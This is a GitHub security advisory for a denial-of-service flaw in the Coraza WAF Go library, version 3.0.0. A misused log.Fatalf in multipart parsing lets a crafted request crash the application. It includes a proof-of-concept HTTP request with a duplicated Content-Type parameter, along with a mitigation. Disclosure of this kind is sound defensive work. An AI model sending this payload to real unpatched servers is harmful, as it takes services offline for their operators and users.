# Potential deny of service

## Package

gomod

github.com/corazawaf/coraza
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

3.0.0

## Patched versions

3.0.1

## Description

### Summary

Due to the misuse of `log.Fatalf`, the application using coraza crashed after receiving crafted requests from attackers.

### Details

[coraza/internal/bodyprocessors/multipart.go](https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29)

Lines 26 to 29
in
[82157f8](/corazawaf/coraza/commit/82157f85f24c6107667bf0f686b71a72aafdf8a5)

|  | mediaType, params, err := mime.ParseMediaType(mimeType) |
| --- | --- |
|  | if err != nil { |
|  | log.Fatalf("failed to parse media type: %s", err.Error()) |
|  | } |

The bodyprocessors of multipart uses `log.Fatalf` to handle errors from the `mime.ParseMediaType`, but `log.Fatalf` calls `os.Exit` directly after logging the error.

<https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291>

This means that the application will immediately crash after receiving a malicious request that triggers an error in `mime.ParseMediaType`.
### PoC

The server can be demonstrated by <https://github.com/corazawaf/coraza/tree/main/examples/http-server>

After sending this request

```
POST / HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: curl/8.1.2
Accept: */*
Content-Length: 199
Content-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2
Connection: close

--------------------------5fa6351b877326a1
Content-Disposition: form-data; name="file"; filename="123"
Content-Type: application/octet-stream

123

--------------------------5fa6351b877326a1--

```

The server will crash immediately. The `a=1; a=2` in `Content-Type` makes `mime: duplicate parameter name` error.

### Impact

I believe the vulnerability was introduced by the following commit: [24af0c8](https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec).

### Mitigation

The error from `mime.ParseMediaType` should return directly.

### Severity

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
